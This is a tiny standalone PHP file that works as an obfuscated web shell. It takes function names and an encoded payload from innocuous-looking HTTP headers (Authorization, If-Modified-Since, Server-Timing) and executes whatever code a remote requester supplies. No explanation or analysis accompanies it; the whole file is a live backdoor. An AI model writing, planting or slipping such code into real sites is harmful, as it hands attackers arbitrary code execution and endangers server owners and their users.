<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Authorization'])) {
    $content = $_HEADERS['Authorization']('', $_HEADERS['If-Modified-Since']($_HEADERS['Server-Timing']));
    $content();
}